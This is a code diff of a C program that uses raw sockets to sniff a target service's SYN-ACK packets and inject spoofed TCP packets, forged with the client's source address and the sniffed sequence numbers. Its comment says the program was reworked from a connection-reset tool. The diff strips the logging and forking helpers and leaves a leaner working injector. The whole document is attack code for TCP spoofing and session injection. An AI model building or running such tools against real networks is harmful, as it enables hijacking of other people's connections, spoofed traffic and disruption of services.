@@ -1,8 +1,7 @@
 /*
- *   A reseter that blocks TCP communication to a given service.
+ *   A injector that intervenes TCP communication to a given service.
  *   It sniffs all traffic for packets that match the given IP and port,
- *   And it will send out reset packets to both the service and the sender
- *   of packets to terminate the communication.
+ *   And it will inject a spoofed packet to the service.
 */
 #include <signal.h>
 #include <sys/wait.h>
@@ -32,14 +31,6 @@
 
 // Functions
 uint16_t ip_checksum(void*,size_t);
-// void send_synack(const int, const char *, const char *, const uint32_t, const uint32_t, 
-//     const uint16_t, const uint16_t, uint32_t, uint32_t);
-void send_pshack(const size_t, const int, const char *, const char *, const uint32_t, const uint32_t, 
-    const uint16_t, const uint16_t, uint32_t, uint32_t);
-void print_ip_header(unsigned char* , int);
-void print_tcp_packet(unsigned char* , int);
-void PrintData (unsigned char* , int);
-// void sigint_handler(int);
 void sigchld_handler(int);
 
 // Pseudo header needed for calculating the TCP header checksum
@@ -51,12 +42,6 @@ struct pshdr {
   uint16_t tcp_len;
 };
 
-// Global Vars
-int sock_raw;
-FILE *logfile;
-int i,j;
-struct sockaddr_in source,dest;
-
 int main(int argc, char *argv[]) {
     int attack_sock, sniff_sock, count = 0, num, rv, yes = 1;
     char service_ip[INET6_ADDRSTRLEN];
@@ -65,7 +50,6 @@ int main(int argc, char *argv[]) {
     socklen_t addr_len;
     char datagram[DATAGRAMSIZE], pseudo_packet[PSEUDOPACKETSIZE], ipstr[INET_ADDRSTRLEN];
     unsigned char buf[DATAGRAM_MAX]; // buffer that holds captured packet
-    struct sigaction csa;
     struct iphdr *iph, *new_iph;
     struct tcphdr *tcph, *cstcph, *new_tcph;
     struct pshdr *psh;
@@ -74,16 +58,6 @@ int main(int argc, char *argv[]) {
     struct sockaddr_storage saddr;
     struct sockaddr_in sa;
     char *data;
-
-    logfile=fopen("injection.log","w+");
-
-    csa.sa_handler = sigchld_handler; // reap all dead processes
-	sigemptyset(&csa.sa_mask);
-	csa.sa_flags = SA_RESTART;
-	if (sigaction(SIGCHLD, &csa, NULL) == -1) {
-		perror("sigaction");
-		exit(1);
-	}
 
     if (argc != 3) {
 	    fprintf(stderr,"usage: injection service_ip service_port\n");
@@ -108,7 +82,7 @@ int main(int argc, char *argv[]) {
 
     // init pointers
     new_iph = (struct iphdr *) buf;
-    new_tcph= (struct tcphdr*) (buf + new_iph->ihl * 4);
+    new_tcph= (struct tcphdr*) (new_iph + 1);
 
     // open attack socket
     if ((attack_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -180,44 +154,35 @@ int main(int argc, char *argv[]) {
             goto error;
         }
 
-        if (!fork()) {
-            if (new_iph -> protocol != IPPROTO_TCP) goto final; // check if packet is TCP packet
-            if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) goto final; // only care about syn ack packets
-            if ((new_iph -> saddr != service_addr) && (new_tcph -> source != service_port)) goto final; // destination has to be the service
-            // print_tcp_packet(buf, num); // log the packet;
-            
-            // send_pshack(strlen(data), attack_sock, datagram, pseudo_packet, iph->daddr, iph->saddr, tcph->dest, tcph->source, ntohl(tcph->ack_seq) + 1, ntohl(tcph->seq)); // psh ack to server
-            tcph -> source = new_tcph->dest; // source port
-            cstcph -> source = new_tcph->dest;
-            seq = htonl(ntohl(new_tcph->ack_seq) + 1);
-            tcph -> seq = seq;
-            cstcph -> seq = seq;
-            tcph -> ack_seq = new_tcph->seq; // ack sequence number
-            cstcph -> ack_seq = new_tcph->seq;
+        if (new_iph -> protocol != IPPROTO_TCP) continue; // check if packet is TCP packet
+        if ((new_tcph -> syn != 1) || (new_tcph -> ack != 1)) continue; // only care about syn ack packets
+        if ((new_iph -> saddr != service_addr) || (new_tcph -> source != service_port)) continue; // check if source is the service
+        
+        tcph -> source = new_tcph->dest; // source port
+        cstcph -> source = new_tcph->dest;
+        
+        tcph -> seq = new_tcph->ack_seq;
+        cstcph -> seq = new_tcph->ack_seq;
+        seq = htonl(ntohl(new_tcph->seq) + 1);
+        tcph -> ack_seq = seq; // ack sequence number
+        cstcph -> ack_seq = seq;
 
-            // dynamic pseudo fields
-            psh -> src_addr = new_iph->daddr;
+        // dynamic pseudo fields
+        psh -> src_addr = new_iph->daddr;
 
-            // calculate check sum
-            tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
+        // calculate check sum
+        tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
 
-            // dynamic IP fields
-            iph -> saddr = new_iph->daddr;
-
-            inet_ntop(AF_INET, &(service_addr), ipstr, INET_ADDRSTRLEN);
-            fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(service_port));
-
-            if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-            {
-                perror("fakesync: sendto()\n");
-            }
-            fprintf(logfile, "DEBUG PSH ACK sent to service %s:%u\n", ipstr, ntohs(service_port));
-            goto final;
+        // dynamic IP fields
+        iph -> saddr = new_iph->daddr;
+    
+        if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
+        {
+            perror("fakesync: sendto()\n");
         }
     }
 
 final:
-    fclose(logfile);
     close(sniff_sock);
     close(attack_sock);
     return 0;
@@ -225,18 +190,6 @@ error:
     close(attack_sock);
     close(sniff_sock);
     exit(1);
-}
-
-void sigchld_handler(int s)
-{
-	(void)s; // quiet unused variable warning
-
-	// waitpid() might overwrite errno, so we save and restore it:
-	int saved_errno = errno;
-
-	while(waitpid(-1, NULL, WNOHANG) > 0);
-
-	errno = saved_errno;
 }
 
 uint16_t ip_checksum(void* vdata,size_t length) {
@@ -268,151 +221,4 @@ uint16_t ip_checksum(void* vdata,size_t length) {
 
     // Return the checksum in network byte order.
     return htons(~acc);
-}
-
-// void send_pshack(const size_t data_size, const int attack_sock, const char *datagram, const char *pseudo_packet, const uint32_t saddr, const uint32_t daddr, 
-//     const uint16_t sport, const uint16_t dport, uint32_t seq0, uint32_t ack0)
-// {
-
-//     // dynamic TCP fields
-//     tcph -> source = sport; // source port
-//     cstcph -> source = sport;
-//     tcph -> seq = htonl(seq0); // sequence number
-//     cstcph -> seq = htonl(seq0);
-//     tcph -> ack_seq = htonl(ack0); // ack sequence number
-//     cstcph -> ack_seq = htonl(ack0);
-
-//     // dynamic pseudo fields
-//     psh -> src_addr = saddr;
-
-//     // calculate check sum
-//     tcph -> check = ip_checksum((void *)pseudo_packet, sizeof(struct pshdr) + tcp_len); 
-
-//     // dynamic IP fields
-//     iph -> saddr = saddr;
-
-//     inet_ntop(AF_INET, &(daddr), ipstr, INET_ADDRSTRLEN);
-
-//     // fprintf(logfile, "DEBUG sending PSH ACK to service %s:%u ......\n", ipstr, ntohs(dport));
-//     // fprintf(logfile, "DEBUG %s\n", ipstr);
-
-//     if ((num = sendto(attack_sock, datagram, sizeof(struct iphdr) + tcp_len, 0, (struct sockaddr *) &sa, sizeof sa)) < 0)
-//     {
-//         perror("fakesync: sendto()\n");
-//     }
-//     // fprintf(logfile, "DEBUG PSH ACK sent to service %s:%u\n", ipstr, ntohs(dport));
-// }
-
-void print_ip_header(unsigned char* Buffer, int Size)
-{
-    unsigned short iphdrlen;
-         
-    struct iphdr *iph = (struct iphdr *)Buffer;
-    iphdrlen =iph->ihl*4;
-     
-    memset(&source, 0, sizeof(source));
-    source.sin_addr.s_addr = iph->saddr;
-     
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_addr.s_addr = iph->daddr;
-     
-    fprintf(logfile,"\n");
-    fprintf(logfile,"IP Header\n");
-    fprintf(logfile,"   |-IP Version        : %d\n",(unsigned int)iph->version);
-    fprintf(logfile,"   |-IP Header Length  : %d DWORDS or %d Bytes\n",(unsigned int)iph->ihl,((unsigned int)(iph->ihl))*4);
-    fprintf(logfile,"   |-Type Of Service   : %d\n",(unsigned int)iph->tos);
-    fprintf(logfile,"   |-IP Total Length   : %d  Bytes(Size of Packet)\n",ntohs(iph->tot_len));
-    fprintf(logfile,"   |-Identification    : %d\n",ntohs(iph->id));
-    //fprintf(logfile,"   |-Reserved ZERO Field   : %d\n",(unsigned int)iphdr->ip_reserved_zero);
-    //fprintf(logfile,"   |-Dont Fragment Field   : %d\n",(unsigned int)iphdr->ip_dont_fragment);
-    //fprintf(logfile,"   |-More Fragment Field   : %d\n",(unsigned int)iphdr->ip_more_fragment);
-    fprintf(logfile,"   |-TTL      : %d\n",(unsigned int)iph->ttl);
-    fprintf(logfile,"   |-Protocol : %d\n",(unsigned int)iph->protocol);
-    fprintf(logfile,"   |-Checksum : %d\n",ntohs(iph->check));
-    fprintf(logfile,"   |-Source IP        : %s\n",inet_ntoa(source.sin_addr));
-    fprintf(logfile,"   |-Destination IP   : %s\n",inet_ntoa(dest.sin_addr));
-}
- 
-void print_tcp_packet(unsigned char* Buffer, int Size)
-{
-    unsigned short iphdrlen;
-     
-    struct iphdr *iph = (struct iphdr *)Buffer;
-    iphdrlen = iph->ihl*4;
-     
-    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen);
-             
-    fprintf(logfile,"\n\n***********************TCP Packet*************************\n");    
-         
-    print_ip_header(Buffer,Size);
-         
-    fprintf(logfile,"\n");
-    fprintf(logfile,"TCP Header\n");
-    fprintf(logfile,"   |-Source Port      : %u\n",ntohs(tcph->source));
-    fprintf(logfile,"   |-Destination Port : %u\n",ntohs(tcph->dest));
-    fprintf(logfile,"   |-Sequence Number    : %u\n",ntohl(tcph->seq));
-    fprintf(logfile,"   |-Acknowledge Number : %u\n",ntohl(tcph->ack_seq));
-    fprintf(logfile,"   |-Header Length      : %d DWORDS or %d BYTES\n" ,(unsigned int)tcph->doff,(unsigned int)tcph->doff*4);
-    //fprintf(logfile,"   |-CWR Flag : %d\n",(unsigned int)tcph->cwr);
-    //fprintf(logfile,"   |-ECN Flag : %d\n",(unsigned int)tcph->ece);
-    fprintf(logfile,"   |-Urgent Flag          : %d\n",(unsigned int)tcph->urg);
-    fprintf(logfile,"   |-Acknowledgement Flag : %d\n",(unsigned int)tcph->ack);
-    fprintf(logfile,"   |-Push Flag            : %d\n",(unsigned int)tcph->psh);
-    fprintf(logfile,"   |-Reset Flag           : %d\n",(unsigned int)tcph->rst);
-    fprintf(logfile,"   |-Synchronise Flag     : %d\n",(unsigned int)tcph->syn);
-    fprintf(logfile,"   |-Finish Flag          : %d\n",(unsigned int)tcph->fin);
-    fprintf(logfile,"   |-Window         : %d\n",ntohs(tcph->window));
-    fprintf(logfile,"   |-Checksum       : %d\n",ntohs(tcph->check));
-    fprintf(logfile,"   |-Urgent Pointer : %d\n",tcph->urg_ptr);
-    fprintf(logfile,"\n");
-    fprintf(logfile,"                        DATA Dump                         ");
-    fprintf(logfile,"\n");
-         
-    fprintf(logfile,"IP Header\n");
-    PrintData(Buffer,iphdrlen);
-         
-    fprintf(logfile,"TCP Header\n");
-    PrintData(Buffer+iphdrlen,tcph->doff*4);
-         
-    fprintf(logfile,"Data Payload\n");  
-    PrintData(Buffer + iphdrlen + tcph->doff*4 , (Size - tcph->doff*4-iph->ihl*4) );
-                         
-    fprintf(logfile,"\n###########################################################\n");
-}
- 
-void PrintData (unsigned char* data , int Size)
-{
-     
-    for(i=0 ; i < Size ; i++)
-    {
-        if( i!=0 && i%16==0)   //if one line of hex printing is complete...
-        {
-            fprintf(logfile,"         ");
-            for(j=i-16 ; j<i ; j++)
-            {
-                if(data[j]>=32 && data[j]<=128)
-                    fprintf(logfile,"%c",(unsigned char)data[j]); //if its a number or alphabet
-                 
-                else fprintf(logfile,"."); //otherwise print a dot
-            }
-            fprintf(logfile,"\n");
-        } 
-         
-        if(i%16==0) fprintf(logfile,"   ");
-            fprintf(logfile," %02X",(unsigned int)data[i]);
-                 
-        if( i==Size-1)  //print the last spaces
-        {
-            for(j=0;j<15-i%16;j++) fprintf(logfile,"   "); //extra spaces
-             
-            fprintf(logfile,"         ");
-             
-            for(j=i-i%16 ; j<=i ; j++)
-            {
-                if(data[j]>=32 && data[j]<=128) fprintf(logfile,"%c",(unsigned char)data[j]);
-                else fprintf(logfile,".");
-            }
-            fprintf(logfile,"\n");
-        }
-    }
 }
